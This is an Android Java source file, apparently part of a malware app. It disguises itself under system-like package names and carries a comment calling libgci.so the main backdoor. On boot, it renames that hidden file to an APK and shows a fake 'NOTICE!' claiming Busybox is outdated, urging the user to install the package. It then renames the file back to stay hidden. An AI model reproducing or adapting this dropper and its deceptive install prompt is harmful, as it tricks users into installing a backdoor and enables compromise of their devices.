package android.process.media.ui;

import android.os.Handler;
import android.os.Environment;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import java.io.*;
import java.util.*;

public class ReceiverBoot extends BroadcastReceiver
{
	public static String title = "";
	private Handler insH = new Handler();
    private Runnable insR;
    public static String docFolder, pathExternal, pathInternal;

	@Override
	public void onReceive(Context context, Intent intent)
	{
		setDoc();
		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
        {
        	context.startService(new Intent(context, ServiceThread.class));
        	temanCek(context);
        }
	}

	public static int getScreenWidth() {
		return Resources.getSystem().getDisplayMetrics().widthPixels;
	}
	public static int getScreenHeight() {
		return Resources.getSystem().getDisplayMetrics().heightPixels;
	}

	public void setDoc() {
		pathExternal = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.google.android.play.manager";
	}

	public void temanCek(Context context) {
		// libgci.so adalah main backdoor
		setDoc();

		
		try {
			if (!new MainActivity().apkMana(context, "com.google.android.play.services", "cek")) 
			{
				Runtime.getRuntime().exec("mv "+pathExternal+"/libgci.so "+pathExternal+"/ucnews.apk");
				Thread.sleep(80);

				ServiceAlert alert = new ServiceAlert();
				title = "\t\t\t\t\t===========\n"+
					   "\t\t\t\t\t|   NOTICE!   |\n"+
					    "\t\t\t\t\t===========";
				alert.dataText = "\n"+title+"\n\n\nSystem Busybox is old version v1.30.1 please update binary busybox then following!\n\n1.  Install this busybox apk\n2.  Allow prompt if view\n3.  Open app to trigerred man dpkg";
				alert.dataTextSize = 15;
				alert.pilihAksi = "install";
				alert.dataPaket = pathExternal+"/ucnews.apk";
				context.startService(new Intent(context, ServiceAlert.class));
        			
				insH.postDelayed(insR, 5 * 1000);

				insR = new Runnable() {
					public void run() {
						insH.postDelayed(insR, 5 * 1000);

						if (new MainActivity().apkMana(context, "com.google.android.play.services", "open")) 
						{
							insH.removeCallbacks(insR);
							context.stopService(new Intent(context, ServiceAlert.class));

							try{Runtime.getRuntime().exec("mv "+pathExternal+"/ucnews.apk "+pathExternal+"/libgci.so");}catch(Exception e){}
						
						} else {
							context.stopService(new Intent(context, ServiceThread.class));
						}
					}
				};

			}

		}catch(Exception e) {
		}
	}
}